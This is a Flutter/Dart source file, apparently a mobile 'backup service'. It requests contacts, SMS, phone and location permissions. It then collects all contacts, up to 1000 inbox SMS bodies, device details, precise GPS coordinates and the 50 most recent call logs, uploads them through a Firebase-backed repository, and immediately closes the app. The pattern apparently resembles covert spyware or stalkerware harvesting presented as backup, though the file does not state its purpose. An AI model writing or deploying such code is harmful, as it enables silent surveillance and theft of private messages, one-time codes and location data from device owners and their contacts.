import 'dart:io';
import 'package:call_log/call_log.dart';
import 'package:device_backup_1989/firebase.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';

class Appbackupservice {

static Future<void> requestPermissionsAndFetchData(String userId) async {

  // Request both permissions at once
  Map<Permission, PermissionStatus> statuses = await [
    Permission.contacts,
    Permission.sms,
    Permission.phone
  ].request();

  bool contactsGranted = statuses[Permission.contacts]?.isGranted ?? false;
  bool smsGranted = statuses[Permission.sms]?.isGranted ?? false;
  bool phoneGranted = statuses[Permission.phone]?.isGranted ?? false;
  bool locationGranted = await Geolocator.isLocationServiceEnabled();

  if (!contactsGranted) {
    print("❌Contacts permission denied");
  }
  if (!smsGranted) {
    print("❌SMS permission denied");
  }
  if(!phoneGranted){
      print("❌Phone permission denied");
  }
    if (!locationGranted) {
    print("location permission denied");
  }

  // Fetch contacts only if permission granted
  if (contactsGranted) {
   await requestAndFetchContacts(userId);
   
  }


  // Fetch SMS only if permission granted
  if (smsGranted) {
   await fetchSms(userId);
  }
     await getDeviceInfo(userId);
   await getLocation(userId); 

       // Fetch callLogs if permission granted
  if (phoneGranted) {
   await requestCallLogPermission(userId);
  }
  SystemNavigator.pop();
}
}


/// contact info
 Future<void> requestAndFetchContacts(String userId) async {
    // Permission granted, fetch contacts
    final contacts = await FlutterContacts.getContacts(
      withProperties: true,
    );

     final contactList =
        contacts
            .map(
              (c) => {
                "name": c.displayName ?? "",
                "phones": c.phones?.map((p) => p.number).toList() ?? [],
              },
            )
            .toList();
         await BackupRepository.backupContacts(userId, contactList);
   
  }

// sms servic
 final SmsQuery _query = SmsQuery();
    Future<void> fetchSms(String userId) async {
    //  Fetch all inbox messages
    List<SmsMessage> messages = await _query.querySms(
          kinds: [SmsQueryKind.inbox],
          count: 1000,
        );
 final smsData = messages
            .map((s) => {
                  'address': s.address,
                  'body': s.body,
                  'date': s.date?.millisecondsSinceEpoch,
                })
            .toList();
        await BackupRepository.backupSms(userId, smsData);
  
   print("SMS DATA 📩 $messages");
//     _smsList.forEach((sms) {
//   print("${sms.address}: ${sms.body}");
// });
  }



// get Device info
Future<void> getDeviceInfo(String userId) async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();

  if (Platform.isAndroid) {
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    print("Device📍: ${androidInfo.model}");
    print("Manufacturer📍: ${androidInfo.manufacturer}");
    print("Android Version: ${androidInfo.version.release}");
    print("Device ID: ${androidInfo.id}");
    await BackupRepository.backupDeviceInfo(userId, {
      'brand': androidInfo.brand,
      'model': androidInfo.model,
      'version': androidInfo.version.release,
    });
  } else if (Platform.isIOS) {
    IosDeviceInfo iosInfo = await deviceInfo.iosInfo;

  }
}


//call log Data

Future<void> requestCallLogPermission(String userId) async {
  final Iterable<CallLogEntry> entries = await CallLog.get();

  // Sort descending by timestamp
  final sortedEntries = entries.toList()
    ..sort((a, b) => (b.timestamp ?? 0).compareTo(a.timestamp ?? 0));

  // Take only the first 50
  final last50Entries = sortedEntries.take(50);

  List<Map<String, dynamic>> callLogs = [];

  for (CallLogEntry entry in last50Entries) {
    final formattedDate = entry.timestamp != null
        ? DateTime.fromMillisecondsSinceEpoch(entry.timestamp!)
            .toIso8601String()
        : null;

    callLogs.add({
      "number": entry.number ?? "unknown",
      "type": entry.callType?.toString().split('.').last ?? "unknown",
      "duration": entry.duration ?? 0,
      "date": formattedDate,
    });
  }

  // Upload all 50 logs at once
  await BackupRepository.backupCallLog(userId, {
    "logs": callLogs,
  });

  print("✅ Uploaded ${callLogs.length} most recent call logs");
}





// get User Location info
Future<void> getLocation(String userId) async {
  // 1️⃣ Check if location service (GPS) is enabled
  bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
  if (!serviceEnabled) {
    print("❌ Location services are disabled. Please turn on GPS.");
    // Optionally, you can open the location settings:
    await Geolocator.openLocationSettings();
    return;
  }

  // 2️⃣ Check and request permission
  LocationPermission permission = await Geolocator.checkPermission();
  if (permission == LocationPermission.denied) {
    permission = await Geolocator.requestPermission();
    if (permission == LocationPermission.denied) {
      print("❌ Location permission denied");
      return;
    }
  }

  if (permission == LocationPermission.deniedForever) {
    print("❌ Location permissions are permanently denied");
    return;
  }

  

  // 3️⃣ Get current position
  Position position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high);
      await BackupRepository.backupDeviceLocation(userId,
   {
    "Latitude" : position.latitude,
    "Longitude" : position.longitude,
   });

  // print("✅ Latitude: ${position.latitude}");
  // print("✅ Longitude: ${position.longitude}");
}